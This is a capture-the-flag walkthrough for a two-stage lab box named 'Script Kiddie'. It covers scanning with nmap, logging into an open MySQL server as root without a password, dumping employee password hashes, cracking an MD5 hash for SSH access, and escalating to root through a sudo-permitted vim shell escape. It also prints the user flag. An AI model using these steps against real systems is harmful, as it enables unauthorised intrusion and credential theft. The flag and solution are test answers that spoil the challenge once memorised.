# Script Kiddie

This is a two stage full-pwn box.

---

## Script Kiddie - User

- As with any Full-pwn box, perorm an nmap scan

```nmap
nmap -sS -sC -sV -T4 <ip>
```

- It should reveal that port 3306 (MySQL) is open. This is unsusual and potential entry point. Run the following command to connect to it

```bash
mysql -h <ip> -u root --skip-ssl
```

- You should have access. We need to see the databases.

```mysql
> show databases;
+--------------------+
| Database           |
+--------------------+
| TechInnovate_Corp  |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
```

- ```TechInnovate_Corp``` seems to be the most relevant here we need to access it.

```mysql
> use TechInnovate_Corp;
> show tables;
> SELECT * FROM employees;
+----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+
| id | employee_id | username   | display_name    | email                       | password_hash                                                    | department  | job_title            | manager_id | is_active | failed_login_attempts | last_login | password_changed_date | created_date        |
+----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+
|  1 | EMP1001     | jwilson    | James Wilson    | jwilson@techinnovate.com    |                                                                  | IT          | System Administrator |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
|  2 | EMP1002     | schen      | Sarah Chen      | schen@techinnovate.com      | $2b$12$LQv3c1yqB.WTQOBd0UwqO.O6oW7jbx1jCJ.9tRk6M2p8uZc6JY8ZO     | Finance     | Financial Analyst    |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
|  3 | EMP1003     | mrodriguez | Maria Rodriguez | mrodriguez@techinnovate.com | $2b$12$N7yA8tBv.CW3eR9wX2z5Qe.rP8sJ3bV2kL.Ma9rK5pYfG4tN1qZsx     | HR          | HR Manager           |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
|  4 | EMP1004     | tjohnson   | Thomas Johnson  | tjohnson@techinnovate.com   | $2b$12$P9zB0uCx.DX4eS0wY3a6Re.sQ9tK4cW3lN.Oa0sL7qZgH5uM2rVwz     | Development | Senior Developer     |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
|  6 | EMP1006     | dthompson  | David Thompson  | dthompson@techinnovate.com  | e3927cf17b05649d1f7ccaa14a5d0f03857a12dd111e7700ffbdf3de03295c2e | Operations  | Operations Manager   |       NULL |         1 |                     0 | NULL       | 2025-11-22 03:24:49   | 2025-11-22 03:24:49 |
|  7 | EMP1007     | lpark      | Lisa Park       | lpark@techinnovate.com      | f01e0d7992a3b7748538d02291b0beae                                 | IT          | Security Analyst     |       NULL |         1 |                     0 | NULL       | 2025-11-22 11:15:22   | 2025-11-22 11:15:22 |
+----+-------------+------------+-----------------+-----------------------------+------------------------------------------------------------------+-------------+----------------------+------------+-----------+-----------------------+------------+-----------------------+---------------------+ 
```

- Lisa Park is IT and is the easiet hash to crack being MD5. Copy the Hash and run it though Hashcat to crack it. It should yield these credentials ```lpark:samantha```

- SSH into the system with the credentials

```bash
ssh lpark@<ip>
```

- You should have access. ```cd``` into /home/alice and there should be the flag ```HashX{903f7343de2838cc95ee4f994bf613ae}```.

---

## Script Kiddie - Root

- Continuing from the previous point, run ```sudo -l``` to see what can be run as sudo on the system.

```bash
lpark@cicractf2:~$ sudo -l
Matching Defaults entries for lpark on cicractf2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User lpark may run the following commands on cicractf2:
    (alice) NOPASSWD: ALL
    (alice) NOPASSWD
```

- We can run sudo with no password as user alice. Let's see what alice can run.

```bash
lpark@cicractf2:~$ sudo -u alice sudo -l
Matching Defaults entries for alice on cicractf2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User alice may run the following commands on cicractf2:
    (root) NOPASSWD: /usr/bin/vim, /usr/bin/vi

```
 
- Alice can run vim/vi as sudo. This is our privelage escalation point. You can get the command in [GTFOBins vim](https://gtfobins.github.io/gtfobins/vim/)

```bash
sudo -u alice sudo vim -c ':!/bin/sh'
```

- You should get a root shell. The cd into /root and get the flag.

---

## Credit

[Chithma Pathirana](https://www.linkedin.com/in/chithma-pathirana-32389b323/) for obtaining the credentials by cracking the MD5 hash.